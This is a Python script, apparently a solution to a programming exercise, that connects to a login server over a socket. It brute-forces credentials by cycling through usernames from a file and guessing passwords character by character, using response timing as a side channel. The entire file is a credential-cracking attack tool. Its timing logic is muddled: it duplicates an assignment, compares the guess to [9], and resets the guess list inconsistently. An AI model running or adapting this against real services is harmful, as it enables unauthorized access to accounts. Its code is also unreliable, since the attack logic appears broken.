import sys
import socket
import itertools
import json
import string
import datetime
rightpass = ''


def passwords():
    #with open('/users/zhaohan_dong/desktop/passwords.txt', 'r') as file:
    #    for line in file:
    #        yield line.rstrip('\n')
    lst = list(string.ascii_letters)
    lst.extend(list(string.digits))
    for i in lst:
        yield i


def login():
    with open('/users/zhaohan_dong/desktop/logins.txt', 'r') as file:
        for line in file:
            yield line.rstrip('\n')


def hack():
    h = {}
    for log in login():
        pa = passwords()
        h["login"] = log
        passw = []
        for p in itertools.cycle(pa):
            passw.append(p)
            h["password"] = ''.join(passw)
            json_str = json.dumps(h, indent=4)

            json_s = json_str.encode()
            start = datetime.datetime.now()
            cli_sock.send(json_s)
            response = cli_sock.recv(1024)
            response = json.loads(response.decode())

            r = response["result"]
            if r == "Wrong login!":
                passw.pop()
                break

            elif r == "Wrong password!":
                finish = datetime.datetime.now()
                difference = difference = (finish - start).total_seconds()
                if len(passw) == 1:
                    if difference > 0.000055:
                        passw = rightpass
                    if passw != [9]:
                        passw = []
                    elif passw == [9]:
                        passw = rightpass
                    continue
                else:
                    continue


            #elif r == "Exception happened during login":
            #    continue

            elif r == "Connection success!":
                print(json_str)
                exit()


args = sys.argv
with socket.socket() as cli_sock:
    ip_address = args[1]
    port = int(args[2])
    address = (ip_address, port)

    cli_sock.connect(address)
    hack()